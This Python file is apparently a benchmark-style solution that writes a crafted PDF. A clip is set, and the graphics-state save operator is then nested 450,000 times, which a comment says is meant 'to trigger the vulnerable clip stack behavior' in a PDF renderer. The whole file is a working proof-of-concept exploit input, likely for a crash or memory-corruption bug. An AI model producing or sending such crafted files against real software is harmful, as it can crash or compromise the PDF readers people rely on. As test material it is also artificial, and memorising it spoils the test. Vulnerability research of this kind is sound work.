import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        def generate_pdf(num_q: int) -> bytes:
            buf = io.BytesIO()
            offsets = {}

            def w(data: bytes):
                buf.write(data)

            # PDF header
            w(b"%PDF-1.4\n")

            def write_obj(obj_id: int, body: bytes):
                offsets[obj_id] = buf.tell()
                w(f"{obj_id} 0 obj\n".encode("ascii"))
                w(body)
                w(b"\nendobj\n")

            # Objects 1-3: basic single-page PDF structure
            write_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")
            write_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
            write_obj(
                3,
                b"<< /Type /Page /Parent 2 0 R "
                b"/MediaBox [0 0 612 792] "
                b"/Contents 4 0 R "
                b"/Resources << >> >>",
            )

            # Object 4: content stream with very deep nesting of 'q' under a clip
            content_stream = b"0 0 100 100 re W n\n" + (b"q\n" * num_q)
            length_str = str(len(content_stream)).encode("ascii")
            stream_header = b"<< /Length " + length_str + b" >>\nstream\n"
            obj4_body = stream_header + content_stream + b"\nendstream"
            write_obj(4, obj4_body)

            num_objects = 4

            # XRef table
            xref_pos = buf.tell()
            w(b"xref\n")
            w(f"0 {num_objects + 1}\n".encode("ascii"))
            w(b"0000000000 65535 f \n")
            for i in range(1, num_objects + 1):
                off = offsets[i]
                w(f"{off:010d} 00000 n \n".encode("ascii"))

            # Trailer
            w(b"trailer\n")
            w(
                b"<< /Size "
                + str(num_objects + 1).encode("ascii")
                + b" /Root 1 0 R >>\n"
            )
            w(b"startxref\n")
            w(str(xref_pos).encode("ascii") + b"\n%%EOF\n")

            return buf.getvalue()

        # Choose depth large enough to trigger the vulnerable clip stack behavior
        num_q = 450000
        return generate_pdf(num_q)
